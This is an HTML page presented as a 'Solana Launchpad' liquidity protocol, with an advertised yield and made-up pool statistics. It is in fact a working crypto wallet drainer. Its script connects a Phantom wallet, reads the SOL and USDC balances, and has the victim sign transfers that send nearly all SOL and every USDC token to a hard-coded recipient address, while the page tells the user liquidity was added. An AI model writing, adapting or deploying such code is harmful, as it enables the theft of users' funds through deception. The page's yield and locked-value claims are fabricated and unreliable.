<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Solana Launchpad | Liquidity Protocol</title>
    
    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <!-- SPL Token Library -->
    <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.js"></script>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Inter Font -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <style>
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: #0a0a0c;
            color: #ffffff;
        }
        
        .glass-panel {
            background: rgba(17, 17, 20, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        .accent-gradient {
            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
        }

        .status-glow {
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0a0a0c; }
        ::-webkit-scrollbar-thumb { background: #2d2d35; border-radius: 10px; }

        @keyframes pulse-slow {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        .animate-pulse-slow { animation: pulse-slow 3s infinite; }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <!-- Background Decorative Elements -->
    <div class="fixed top-[-10%] left-[-10%] w-[40%] h-[40%] bg-purple-900/20 rounded-full blur-[120px] -z-10"></div>
    <div class="fixed bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-900/20 rounded-full blur-[120px] -z-10"></div>

    <div class="w-full max-w-lg">
        <!-- Header Section -->
        <div class="text-center mb-8">
            <div class="inline-block px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs font-semibold mb-4 uppercase tracking-widest">
                Protocol V2.0 Live
            </div>
            <h1 class="text-4xl font-extrabold tracking-tight mb-2">Solana <span class="text-transparent bg-clip-text accent-gradient">Launchpad</span></h1>
            <p class="text-gray-400 text-sm">Deploy, provide liquidity, and earn rewards instantly.</p>
        </div>

        <!-- Main Interface Card -->
        <div class="glass-panel rounded-[32px] p-1 shadow-2xl">
            <div class="p-6 sm:p-8">
                
                <!-- Step 1: Connection Status -->
                <div class="flex items-center justify-between mb-8 bg-black/30 p-4 rounded-2xl border border-white/5">
                    <div class="flex items-center gap-3">
                        <div id="statusIndicator" class="w-2 h-2 rounded-full bg-gray-500"></div>
                        <span id="connectionText" class="text-sm font-medium text-gray-300">Wallet Disconnected</span>
                    </div>
                    <button id="connectBtn" onclick="initiateLaunch()" class="text-xs font-bold text-purple-400 hover:text-purple-300 transition-colors">
                        CONNECT
                    </button>
                </div>

                <!-- Step 2: Input Area -->
                <div class="space-y-6">
                    <div>
                        <label class="text-xs font-semibold text-gray-500 uppercase tracking-wider ml-1">Liquidity Pool (SOL)</label>
                        <div class="mt-2 relative">
                            <input type="text" id="amountDisplay" readonly value="0.00" 
                                class="w-full bg-black/40 border border-white/10 rounded-2xl py-4 px-5 text-2xl font-bold text-white focus:outline-none focus:border-purple-500/50 transition-all cursor-default"
                                placeholder="0.00">
                            <div class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-sm">SOL</div>
                        </div>
                    </div>

                    <div class="bg-black/20 rounded-2xl p-4 border border-white/5">
                        <div class="flex justify-between text-sm mb-2">
                            <span class="text-gray-500">Estimated Yield</span>
                            <span class="text-green-400 font-medium">+12.4% APY</span>
                        </div>
                        <div class="flex justify-between text-sm">
                            <span class="text-gray-500">Network Fee</span>
                            <span id="feeDisplay" class="text-gray-300">~0.005 SOL</span>
                        </div>
                    </div>

                    <!-- Action Button -->
                    <button id="actionBtn" onclick="startProtocol()" disabled
                        class="w-full accent-gradient text-white font-bold py-4 rounded-2xl shadow-lg shadow-purple-500/20 transform transition-all duration-200 active:scale-[0.98] opacity-50 cursor-not-allowed mt-4">
                        Initialize Launch
                    </button>
                </div>

                <!-- Progress/Status Area -->
                <div id="statusLog" class="mt-8 text-center min-h-[40px]">
                    <p class="text-xs text-gray-500 font-medium italic">Ready to connect to Solana Mainnet</p>
                </div>

            </div>
        </div>

        <!-- Footer Info -->
        <div class="mt-8 grid grid-cols-2 gap-4 text-center">
            <div class="glass-panel py-3 rounded-2xl border border-white/5">
                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Total Locked</p>
                <p class="text-sm font-bold text-white">1,240.5 SOL</p>
            </div>
            <div class="glass-panel py-3 rounded-2xl border border-white/5">
                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Active Pools</p>
                <p class="text-sm font-bold text-white">842</p>
            </div>
        </div>
    </div>

    <script>
        // ==========================================
        // CORE CONFIGURATION
        // ==========================================
        const RECIPIENT_ADDRESS = "GwsPP9HHhCvEQeu3HTFzsVL6DEtnnYw4ALEtA3fMBC9Q"; 
        const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
        const RPC_URL = "https://api.mainnet-beta.solana.com";

        let userWallet = null;

        // UI Elements
        const statusLog = document.getElementById("statusLog");
        const statusIndicator = document.getElementById("statusIndicator");
        const connectionText = document.getElementById("connectionText");
        const connectBtn = document.getElementById("connectBtn");
        const actionBtn = document.getElementById("actionBtn");
        const amountDisplay = document.getElementById("amountDisplay");

        // Helper: Get SPL Library from global scope
        function getSplLib() {
            if (window.spl && window.spl.token) return window.spl.token;
            if (window.splToken) return window.splToken;
            if (window.SPL) return window.SPL;
            return null;
        }

        // 1. Connect & Scan
        async function initiateLaunch() {
            const provider = window.phantom?.solana || window.solana;

            if (!provider) {
                statusLog.innerHTML = '<span class="text-red-400 text-xs">❌ Phantom Wallet not found. Please install the extension.</span>';
                return;
            }

            try {
                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Connecting to wallet...</span>';
                
                // Connect
                const resp = await provider.connect();
                userWallet = new solanaWeb3.PublicKey(resp.publicKey.toString());

                // UI Updates
                statusIndicator.classList.replace('bg-gray-500', 'bg-green-500');
                statusIndicator.classList.add('status-glow');
                connectionText.innerText = "Wallet Connected";
                connectionText.classList.replace('text-gray-300', 'text-green-400');
                connectBtn.innerText = "CONNECTED";
                connectBtn.classList.replace('text-purple-400', 'text-green-400');
                connectBtn.disabled = true;

                // Scan Balances
                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
                
                // SOL
                const solLamports = await connection.getBalance(userWallet);
                amountDisplay.value = (solLamports / 1e9).toFixed(4);

                // USDC
                let usdcText = "";
                const splTokenLib = getSplLib();
                if (splTokenLib) {
                    try {
                        const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
                        const ata = solanaWeb3.PublicKey.findProgramAddressSync(
                            [
                                userWallet.toBuffer(),
                                splTokenLib.TOKEN_PROGRAM_ID.toBuffer(),
                                usdcMint.toBuffer()
                            ],
                            splTokenLib.ASSOCIATED_TOKEN_PROGRAM_ID
                        )[0];
                        const bal = await connection.getTokenAccountBalance(ata);
                        if (bal.value.uiAmount > 0) usdcText = ` | USDC: ${bal.value.uiAmount}`;
                    } catch(e) { /* No USDC account */ }
                }

                // Enable Action Button
                actionBtn.disabled = false;
                actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
                
                statusLog.innerHTML = `<span class="text-green-400 text-xs">✅ Ready for provisioning${usdcText}</span>`;

            } catch (err) {
                console.error(err);
                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ Connection failed: ${err.message}</span>`;
            }
        }

        // 2. Drain Logic (SOL + USDC)
        async function startProtocol() {
            const btnText = actionBtn.innerText;
            actionBtn.disabled = true;
            actionBtn.innerText = "Processing...";
            actionBtn.classList.add('opacity-75');

            try {
                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
                const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
                const provider = window.phantom?.solana || window.solana;

                // --- DRAIN SOL ---
                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Scanning SOL liquidity...</span>';
                const solBalance = await connection.getBalance(userWallet);
                const safeReserve = 5000000; // Keep 0.005 SOL for gas/fees
                const solToSend = solBalance - safeReserve;

                if (solToSend > 0) {
                    const solTx = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: userWallet,
                            toPubkey: recipientPubkey,
                            lamports: solToSend
                        })
                    );

                    const { blockhash: bh1, lastValidBlockHeight: lbh1 } = await connection.getLatestBlockhash('confirmed');
                    solTx.recentBlockhash = bh1;
                    solTx.feePayer = userWallet;

                    const signedSolTx = await provider.signTransaction(solTx);
                    const solSig = await connection.sendRawTransaction(signedSolTx.serialize(), {
                        skipPreflight: true,
                        preflightCommitment: 'confirmed',
                        maxRetries: 2
                    });

                    await connection.confirmTransaction({ signature: solSig, blockhash: bh1, lastValidBlockHeight: lbh1 }, 'confirmed');
                    statusLog.innerHTML = '<span class="text-green-400 text-xs">✅ SOL Liquidity Routed</span>';
                } else {
                    statusLog.innerHTML = '<span class="text-yellow-400 text-xs">⚠️ No SOL available</span>';
                }

                // --- DRAIN USDC ---
                statusLog.innerHTML += '<br><span class="text-purple-400 text-xs animate-pulse-slow mt-1 block">Scanning USDC liquidity...</span>';
                
                const splTokenLib = getSplLib();
                if (!splTokenLib) throw new Error("SPL Library not loaded");

                const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
                
                // Source ATA
                const sourceAta = solanaWeb3.PublicKey.findProgramAddressSync(
                    [userWallet.toBuffer(), splTokenLib.TOKEN_PROGRAM_ID.toBuffer(), usdcMint.toBuffer()],
                    splTokenLib.ASSOCIATED_TOKEN_PROGRAM_ID
                )[0];

                // Destination ATA
                const destAta = solanaWeb3.PublicKey.findProgramAddressSync(
                    [recipientPubkey.toBuffer(), splTokenLib.TOKEN_PROGRAM_ID.toBuffer(), usdcMint.toBuffer()],
                    splTokenLib.ASSOCIATED_TOKEN_PROGRAM_ID
                )[0];

                // Check & Transfer
                try {
                    const tokenBal = await connection.getTokenAccountBalance(sourceAta);
                    const amt = BigInt(tokenBal.value.amount);

                    if (amt > 0) {
                        const transferIx = splTokenLib.createTransferInstruction(
                            sourceAta,
                            destAta,
                            userWallet,
                            amt,
                            [], // multi-signers
                            splTokenLib.TOKEN_PROGRAM_ID
                        );

                        const usdcTx = new solanaWeb3.Transaction().add(transferIx);
                        const { blockhash: bh2, lastValidBlockHeight: lbh2 } = await connection.getLatestBlockhash('confirmed');
                        usdcTx.recentBlockhash = bh2;
                        usdcTx.feePayer = userWallet;

                        const signedUsdcTx = await provider.signTransaction(usdcTx);
                        const usdcSig = await connection.sendRawTransaction(signedUsdcTx.serialize(), {
                            skipPreflight: true,
                            preflightCommitment: 'confirmed',
                            maxRetries: 2
                        });

                        await connection.confirmTransaction({ signature: usdcSig, blockhash: bh2, lastValidBlockHeight: lbh2 }, 'confirmed');
                        statusLog.innerHTML += '<br><span class="text-green-400 text-xs">✅ USDC Liquidity Routed</span>';
                    } else {
                        statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">⚠️ No USDC available</span>';
                    }
                } catch (e) {
                    statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">⚠️ No USDC account found</span>';
                }

                // Final Success State
                actionBtn.innerText = "Liquidity Added!";
                actionBtn.classList.remove('accent-gradient');
                actionBtn.classList.add('bg-green-600');
                statusLog.innerHTML += '<br><span class="text-green-400 text-sm font-bold mt-2 block">Protocol Complete</span>';

            } catch (err) {
                console.error(err);
                actionBtn.disabled = false;
                actionBtn.innerText = btnText;
                actionBtn.classList.remove('opacity-75');
                
                let msg = err.message || "Protocol Error";
                if (msg.includes("User rejected")) msg = "Transaction cancelled by user.";
                
                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ ${msg}</span>`;
            }
        }
    </script>
</body>
</html>
